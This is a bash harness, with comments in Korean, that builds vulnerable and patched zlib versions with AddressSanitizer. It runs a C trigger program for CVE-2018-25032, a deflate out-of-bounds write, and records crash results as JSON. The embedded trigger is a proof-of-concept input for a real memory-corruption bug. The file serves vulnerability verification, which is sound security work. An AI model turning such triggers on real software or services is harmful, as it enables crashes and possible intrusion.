#!/usr/bin/env bash
# C 라이브러리 CVE 실행 검증 harness (WSL + AddressSanitizer)
# 실행검증 방식: 취약 버전 ASan 빌드 -> 트리거 실행 -> 크래시 관측 -> 패치 대조
# 사용: wsl -e bash tools/exec_verify_c.sh
# 출력: results/exec_verification_c.json
#
# 각 CVE 스펙: repo, 취약 tag, 패치 tag, configure/build, 트리거 소스, 크래시 신호.
# 트리거는 CVE별로 확보 필요(공개 PoC / 패치 회귀테스트 / 파라미터 스윕).
set -u
export ASAN_OPTIONS=detect_leaks=0
WORK=/tmp/exec_verify_c
OUT_DIR="$(cd "$(dirname "$0")/.." && pwd)/results"
mkdir -p "$WORK" "$OUT_DIR"
RESULTS="[]"

build() {  # repo tag outdir
  local repo="$1" tag="$2" out="$3"
  [ -d "$out" ] && return 0
  git -c advice.detachedHead=false clone -q --depth 1 --branch "$tag" "$repo" "$out" 2>/dev/null || return 1
  ( cd "$out" && CFLAGS="-fsanitize=address -g -O1" ./configure --static >/dev/null 2>&1 && make -s libz.a >/dev/null 2>&1 )
}

verify_zlib_2018_25032() {
  local cve="CVE-2018-25032" cwe="CWE-787"
  cd "$WORK"
  build https://github.com/madler/zlib.git v1.2.11 z_vuln || { echo "  build vuln FAIL"; return; }
  build https://github.com/madler/zlib.git v1.2.12 z_patch || { echo "  build patch FAIL"; return; }
  cat > trig.c <<'EOF'
#include <zlib.h>
#include <string.h>
#include <stdlib.h>
int main(void){
  z_stream s; memset(&s,0,sizeof(s));
  if(deflateInit2(&s,9,Z_DEFLATED,15,4,Z_FIXED)!=Z_OK)return 2;
  size_t n=1<<20; unsigned char*in=malloc(n),*out=malloc(n+4096);
  unsigned char base[271]; for(int i=0;i<271;i++)base[i]=(i*131+7)&0xff;
  for(size_t i=0;i<n;i++)in[i]=(i%1024<271)?base[i%271]:(unsigned char)(i*2654435761u>>24);
  s.next_in=in;s.avail_in=n;s.next_out=out;s.avail_out=n+4096;
  deflate(&s,Z_FINISH); deflateEnd(&s); free(in);free(out); return 0;
}
EOF
  gcc -fsanitize=address -g trig.c -Iz_vuln  z_vuln/libz.a  -o t_vuln  2>/dev/null
  gcc -fsanitize=address -g trig.c -Iz_patch z_patch/libz.a -o t_patch 2>/dev/null
  local rv rp vsig
  rv=$(./t_vuln 2>&1);  rp=$(./t_patch 2>&1)
  vsig=$(echo "$rv" | grep -oE "AddressSanitizer: [a-z-]+" | head -1)
  local vuln_crash=false patch_crash=false
  echo "$rv" | grep -q AddressSanitizer && vuln_crash=true
  echo "$rp" | grep -q AddressSanitizer && patch_crash=true
  local verdict="INCONCLUSIVE"
  [ "$vuln_crash" = true ] && [ "$patch_crash" = false ] && verdict="EXPLOITABLE"
  echo "  $cve: vuln_crash=$vuln_crash patch_crash=$patch_crash -> $verdict [$vsig]"
  # JSON 은 소문자 true/false 를 그대로 사용
  RESULTS=$(printf '%s' "$RESULTS" | sed 's/]$//; s/^\[$/[/')
  [ "$RESULTS" != "[" ] && RESULTS="$RESULTS,"
  RESULTS="$RESULTS
  {\"cve\":\"$cve\",\"cwe\":\"$cwe\",\"component\":\"zlib\",\"vuln_version\":\"1.2.11\",\"patched_version\":\"1.2.12\",\"vuln_crash\":$vuln_crash,\"patched_crash\":$patch_crash,\"signal\":\"${vsig:-none}\",\"verdict\":\"$verdict\",\"method\":\"WSL + AddressSanitizer, build vuln vs patched, execute trigger\"}"
}
RESULTS="["

echo '=== C 라이브러리 실행 검증 (WSL + ASan) ==='
verify_zlib_2018_25032
RESULTS="$RESULTS
]"
echo "$RESULTS" | python3 -m json.tool > "$OUT_DIR/exec_verification_c.json" 2>/dev/null || echo "$RESULTS" > "$OUT_DIR/exec_verification_c.json"
echo "saved: $OUT_DIR/exec_verification_c.json"
